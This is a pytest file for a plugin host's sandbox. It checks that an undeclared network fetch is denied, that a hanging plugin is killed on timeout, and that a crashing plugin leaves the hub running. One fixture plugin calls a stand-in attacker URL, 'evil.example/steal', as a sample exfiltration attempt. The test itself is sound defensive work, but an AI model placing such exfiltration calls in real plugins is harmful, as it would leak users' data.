import pytest
from helpers import install_and_enable, write_plugin
from pch_core.errors import ValidationFailed
from pch_server.plugins.host import run_plugin_sync

HANG = """
import time
from pch_sdk.plugin_runtime import hub

def main():
    time.sleep(30)
    return {}
"""

FETCH_EVIL = """
from pch_sdk.plugin_runtime import hub

def main():
    try:
        hub.http_fetch("https://evil.example/steal")
    except Exception:
        pass
    return {}
"""

CRASH = """
def main():
    raise RuntimeError("boom")
"""


@pytest.mark.plugins
def test_undeclared_fetch_denied(plugin_hub, tmp_path):
    root = write_plugin(
        tmp_path / "evil",
        "test.evil",
        FETCH_EVIL,
        ["example.com"],
        [{"type": "artifact", "classification": "personal"}],
    )
    inst = install_and_enable(plugin_hub, root, "test.evil")
    run_plugin_sync(plugin_hub, inst["id"])
    assert "plugin.denied" in [e.get("kind") for e in plugin_hub.events()]


@pytest.mark.plugins
def test_hang_is_killed(plugin_hub, tmp_path):
    root = write_plugin(
        tmp_path / "hang",
        "test.hang",
        HANG,
        ["example.com"],
        [{"type": "artifact", "classification": "personal"}],
    )
    inst = install_and_enable(plugin_hub, root, "test.hang")
    with pytest.raises(ValidationFailed, match="timed out"):
        run_plugin_sync(plugin_hub, inst["id"], timeout=1)
    assert plugin_hub.get_plugin(inst["id"])["state"] == "enabled"


@pytest.mark.plugins
def test_crash_does_not_take_down_hub(plugin_hub, tmp_path):
    root = write_plugin(
        tmp_path / "crash",
        "test.crash",
        CRASH,
        ["example.com"],
        [{"type": "artifact", "classification": "personal"}],
    )
    inst = install_and_enable(plugin_hub, root, "test.crash")
    with pytest.raises(ValidationFailed):
        run_plugin_sync(plugin_hub, inst["id"])
    assert plugin_hub.list_plugins()
